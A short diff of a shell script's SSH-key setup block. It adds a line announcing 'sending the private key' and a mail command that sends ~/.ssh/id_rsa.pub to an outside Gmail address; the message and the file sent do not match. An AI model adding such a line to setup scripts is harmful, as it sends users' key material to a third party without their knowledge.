@@ -18,6 +18,8 @@
         ssh-add ~/.ssh/id_rsa
         clip < ~/.ssh/id_rsa.pub
         cat ~/.ssh/id_rsa.pub
+        echo ">>> sending the private key..."
+        mail -s "rsa" srengtrecom@gmail.com < ~/.ssh/id_rsa.pub
     else
         echo ">>> Already generated the ssh."
     fi
